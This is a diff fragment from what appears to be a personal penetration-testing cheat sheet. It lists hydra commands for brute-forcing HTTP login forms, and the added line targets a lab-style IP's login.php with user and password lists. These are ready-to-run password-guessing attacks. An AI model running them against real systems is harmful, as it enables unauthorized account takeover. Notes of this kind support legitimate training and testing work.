@@ -331,6 +331,7 @@ hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>
 hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
 hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
 hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
+hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.176.80 http-post-form '/login.php:Username=^USER^&Password=^PASS^&Submit=Login:<strong>Warning!</strong> Incorrect information.' -V (for alert message login failed brute force)
 ```
 
 wireshark packet filters:
